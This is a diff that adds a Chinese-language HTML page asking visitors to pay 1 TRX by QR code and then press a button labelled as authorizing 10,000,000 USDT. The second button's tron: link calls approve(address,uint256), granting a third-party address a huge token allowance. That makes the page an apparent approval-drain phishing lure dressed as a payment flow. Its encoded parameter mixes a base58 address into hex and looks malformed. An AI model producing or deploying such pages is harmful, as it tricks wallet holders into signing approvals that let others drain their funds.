@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <title>支付後授權 USDT</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: sans-serif; background: #fff; text-align: center; padding: 2em; }
+    h1 { color: #2d3436; }
+    a.button {
+      display: inline-block;
+      margin-top: 2em;
+      background: #0984e3;
+      color: white;
+      padding: 1em 2em;
+      text-decoration: none;
+      font-size: 1.2em;
+      border-radius: 8px;
+    }
+    .tip { margin-top: 2em; font-size: 0.9em; color: #636e72; }
+  </style>
+</head>
+<body>
+  <h1>請支付 1 TRX 開始授權</h1>
+  <p>掃描下方 QR Code 或點擊付款，支付後系統將引導你授權 10,000,000 USDT。</p>
+
+  <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=tron:THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR" alt="QR Code"><br>
+  <a class="button" href="tron:THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR">點我付款 1 TRX</a>
+
+  <div class="tip">
+    支付完成後請點擊下方按鈕完成授權 👇
+  </div>
+  <a class="button" style="background:#00b894; margin-top:1em;" href="tron:TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj?function_selector=approve(address,uint256)&parameter=000000000000000000000000TMxu165T2e3ZKWzgt7gipzmHwE5KYuibGa000000000000000000000000000000000000000000000000000009184e72a000">
+    授權 10,000,000 USDT
+  </a>
+</body>
+</html>
